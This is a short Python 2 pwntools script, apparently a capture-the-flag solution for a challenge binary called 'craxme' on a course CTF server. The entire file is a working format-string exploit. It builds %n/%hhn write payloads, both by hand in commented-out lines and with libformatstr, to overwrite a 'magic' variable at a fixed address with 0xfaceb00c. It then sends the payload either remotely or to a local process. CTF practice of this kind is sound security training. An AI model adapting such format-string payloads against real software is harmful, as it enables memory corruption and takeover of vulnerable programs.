from pwn import *
from pwnlib import *
import libformatstr
from libformatstr import FormatStr

if args.args['REMOTE']:
    p = connect('csie.ctf.tw', 10134)
else:
    p = process('./craxme-2da5957de53a93b4bc9ffb4e46c8bf287df0376c')

magic_address = 0x60106c

'''
0c 12
b0 176 164
ce 206 30
fa 250 44
'''

# payload = '%218c%8$n0000000' + p64(magic_address)
# payload = '%12c%12$hhn%164c%13$hhn%30c%14$hhn%44c%15$hhn000' + p64(magic_address) + p64(magic_address+1) + p64(magic_address+2) + p64(magic_address+3)
# gdb.attach(p, gdbscript='b *0x40079d')
# raw_input()
context.arch='amd64'
f = FormatStr(isx64=True)
# f[magic_address] = 0xda
f[magic_address] = 0xfaceb00c
payload = f.payload(6)
print payload

p.send(payload)
print p.recvall()
